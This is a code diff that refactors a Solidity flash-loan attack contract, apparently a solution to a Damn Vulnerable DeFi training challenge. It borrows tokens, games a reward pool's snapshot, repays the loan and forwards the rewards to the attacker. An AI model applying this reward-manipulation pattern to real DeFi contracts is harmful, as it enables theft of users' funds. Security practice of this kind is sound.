@@ -29,26 +29,24 @@ contract FlashLoanReceiver {
     address private _flashLoanerPool;
     address private _rewarderPool;
     address private _dvt;
-    address private _rewardToken;
-    address private _accToken;
+    address private _rewardTokenAddress;
 
     error SenderIsNotFlashLoanerPool();
     error SenderIsNotOwner();
+    error TransferFail();
+    error CallFailed();
 
     constructor(
-        address attacker,
         address flashLoanerPool,
         address rewarderPool,
         address dvtAddress,
-        address rewardTokenAddress,
-        address accTokenAddress
+        address rewardTokenAddress
     ) {
-        _attacker = attacker;
+        _attacker = msg.sender;
         _flashLoanerPool = flashLoanerPool;
         _rewarderPool = rewarderPool;
         _dvt = dvtAddress;
-        _rewardToken = rewardTokenAddress;
-        _accToken = accTokenAddress;
+        _rewardTokenAddress = rewardTokenAddress;
     }
 
     function attack(uint256 amount) external {
@@ -60,31 +58,31 @@ contract FlashLoanReceiver {
 
     function receiveFlashLoan(uint256 amount) external {
         if (msg.sender != _flashLoanerPool) revert SenderIsNotFlashLoanerPool();
-        _dvt.functionCall(
-            abi.encodeWithSignature("approve(address,uint256)", _rewarderPool, amount)
-        );
+        if (!DamnValuableToken(_dvt).approve(_rewarderPool, amount))
+            revert CallFailed();
+
         _rewarderPool.functionCall(
             abi.encodeWithSignature("deposit(uint256)", amount)
         );
+
+        if (DamnValuableToken(_dvt).balanceOf(address(this)) > 0)
+            revert("deposit failed");
+
         _rewarderPool.functionCall(
             abi.encodeWithSignature("distributeRewards()")
         );
         _rewarderPool.functionCall(
             abi.encodeWithSignature("withdraw(uint256)", amount)
         );
-        _dvt.functionCall(
-            abi.encodeWithSignature(
-                "transfer(address,uint256)",
-                _flashLoanerPool,
-                amount
-            )
+
+        if (!DamnValuableToken(_dvt).transfer(_flashLoanerPool, amount))
+            revert TransferFail();
+
+        uint256 rewards = RewardToken(_rewardTokenAddress).balanceOf(
+            address(this)
         );
-        _rewardToken.functionCall(
-            abi.encodeWithSignature(
-                "transfer(address,uint256)",
-                _attacker,
-                amount
-            )
-        );
+
+        if (!RewardToken(_rewardTokenAddress).transfer(_attacker, rewards))
+            revert TransferFail();
     }
 }
